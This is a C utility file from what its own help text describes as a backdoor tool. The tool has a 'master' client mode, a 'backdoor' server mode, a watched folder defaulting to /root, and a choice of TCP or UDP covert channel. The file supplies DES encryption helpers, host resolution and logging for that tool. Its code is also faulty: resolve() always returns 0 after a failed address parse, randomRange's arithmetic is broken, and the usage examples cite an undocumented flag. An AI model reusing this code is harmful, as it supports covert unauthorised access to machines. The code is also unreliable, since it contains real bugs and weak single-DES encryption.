/*
 * util.c
 *
 *  Created on: May 16, 2014
 *      Author: root
 */

#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <openssl/des.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <sys/types.h>
#include <time.h>

#include "util.h"

void error(const char *err) {
	fprintf(stderr, "ERROR => %s\n", err);
	exit(1);
}

void usage(char *name) {
	printf("Usage: %s [options]\n", name);
	printf(" -c Use client mode: Act as master.\n");
	printf(" -b Use server mode: Act as backdoor. [default]\n");
	printf(" -h Show this help listing.\n");
	printf(
			" -d <arg> Destination host address for client/server mode. [default=127.0.0.1]\n");
	printf(" -s <arg> Source host address for client/server mode.");
	printf(" -w <arg> Folder to watch. [default=/root]\n");
	printf(" -x [tcp/udp] Covert channel to use(TCP OR UDP). [default=TCP]\n");
	printf(" EXAMPLES:\t %s -c -i 192.168.0.1 -x t\n", name);
	printf(" EXAMPLES:\t %s -s -i 192.168.0.2 -x t\n", name);

	exit(0);
}

FILE* open_file(char* fname, uint8 writeMode) {
	FILE *file;

	if (writeMode) {
		if ((file = fopen(fname, "wb")) == NULL)
			error("Error opening open input file.");
	} else {
		if ((file = fopen(fname, "rb")) == NULL)
			error("Error opening open output file.");
	}

	return file;
}

void encrypt(char *key, char *msg, int size) {
	static char* result;
	int n = 0;
	DES_cblock key2;
	DES_key_schedule schedule;

	result = (char*) malloc(size);

	// Prepare the key for use with DES_cfb64_encrypt
	memcpy(key2, key, 8);
	DES_set_odd_parity(&key2);
	DES_set_key_checked(&key2, &schedule);

	// Encryption occurs here
	DES_cfb64_encrypt((unsigned char*) msg, (unsigned char*) result, size,
			&schedule, &key2, &n, DES_ENCRYPT);
	memcpy(msg, result, size);

	free(result);
}

void decrypt(char *key, char *msg, int size) {
	static char* result;
	int n = 0;
	DES_cblock key2;
	DES_key_schedule schedule;

	result = (char*) malloc(size);

	// Prepare the key for use with DES_cfb64_encrypt
	memcpy(key2, key, 8);
	DES_set_odd_parity(&key2);
	DES_set_key_checked(&key2, &schedule);

	// Decryption occurs here
	DES_cfb64_encrypt((unsigned char*) msg, (unsigned char*) result, size,
			&schedule, &key2, &n, DES_DECRYPT);
	memcpy(msg, result, size);

	free(result);
}

unsigned int resolve(char *hostname) {
	static struct in_addr i;
	struct hostent *h;

	i.s_addr = inet_addr(hostname);
	if (i.s_addr == -1) {
		h = gethostbyname(hostname);

		if (h == NULL)
			fprintf(stderr, "cannot resolve %s\n", hostname);
		return 0;

		bcopy(h->h_addr, (char *) &i.s_addr, h->h_length);
	}

	return i.s_addr;
}

int randomRange(int Min, int Max) {

	// initialize random function
	srand(time(NULL) + getpid());

	int diff = Max - Min;
	srand(getpid() * time(NULL));
	return (int) (((unsigned int) (diff + 1) / RAND_MAX) * rand() + Min);
}

void writeToFile(char frame) {
	FILE *file;

	file = fopen("results.log", "a+");
	fprintf(file, "%c", frame);
	fclose(file);
}
